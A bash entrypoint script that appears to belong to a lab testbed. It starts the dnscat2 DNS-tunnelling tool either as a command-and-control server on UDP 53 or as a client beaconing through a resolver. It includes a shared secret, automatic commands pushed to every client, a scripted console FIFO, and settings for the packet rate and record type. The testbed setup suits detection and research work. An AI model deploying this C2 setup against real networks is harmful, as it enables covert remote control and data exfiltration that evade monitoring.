#!/usr/bin/env bash
# dnscat2 testbed node.
#   ROLE=server -> Ruby server, listens on UDP 53 for $DOMAIN
#   ROLE=client -> C client, beacons in through the resolver
# A shared pre-shared secret is set on both sides so the encrypted session
# establishes without interactive confirmation.
set -euo pipefail

ROLE="${ROLE:?set ROLE=server or client}"
DOMAIN="${DOMAIN:-d.tunnel.test}"
SECRET="${DNSCAT_SECRET:-testbedsecret}"

if [ "$ROLE" = "server" ]; then
    cd /opt/dnscat2/server
    echo "[dnscat2-server] listening on UDP/53 for $DOMAIN"
    # NOTE: keep the cache ON (do NOT pass --no-cache). A recursive resolver
    # (our BIND) re-sends the same query multiple times; the cache dedupes them
    # so the session doesn't desync. Without it: handshake works, then SERVFAIL.
    # --firehose prints every session's data to stdout, so `docker logs` shows what
    # arrived and run_tool.sh can check a transfer without driving the console.
    ARGS=(--dns "domain=${DOMAIN},host=0.0.0.0,port=53" --secret "$SECRET" --firehose)
    # Optional scripted C2: a console command sent to every client that connects.
    if [ -n "${DNSCAT_AUTO_COMMAND:-}" ]; then
        ARGS+=(--auto-command "$DNSCAT_AUTO_COMMAND")
    fi
    # The operator console reads a FIFO instead of a terminal, so run_tool.sh can script
    # a C2 session by writing command lines to /tmp/console. Opening it read-write (fd 3)
    # keeps a writer attached, so the server never sees end-of-file.
    rm -f /tmp/console && mkfifo /tmp/console
    exec 3<>/tmp/console
    exec ruby ./dnscat2.rb "${ARGS[@]}" <&3
fi

if [ "$ROLE" = "client" ]; then
    RESOLVER="${RESOLVER:-172.28.0.2}"
    sleep "${START_DELAY:-10}"       # let the server boot + bundle settle
    cd /opt/dnscat2/client
    DELAY="${DNSCAT_DELAY:-1000}"    # dnscat2's throttle: max ms between packets
    DNS_OPTS="server=${RESOLVER},domain=${DOMAIN}"
    # Record types the client rotates through (dnscat2's "encoding" knob).
    if [ -n "${DNSCAT_TYPE:-}" ]; then DNS_OPTS="${DNS_OPTS},type=${DNSCAT_TYPE}"; fi
    ARGS=(--dns "$DNS_OPTS" --secret "$SECRET" --delay "$DELAY")
    # --steady: always wait the full delay. Without it the client sends the next packet
    # as soon as a reply arrives, so --delay does not slow a transfer down.
    if [ "${DNSCAT_STEADY:-0}" = "1" ]; then ARGS+=(--steady); fi
    echo "[dnscat2-client] beaconing to $DOMAIN via resolver $RESOLVER (${ARGS[*]:2})"
    exec ./dnscat "${ARGS[@]}"
fi

echo "unknown ROLE: $ROLE (use server or client)" >&2
exit 1
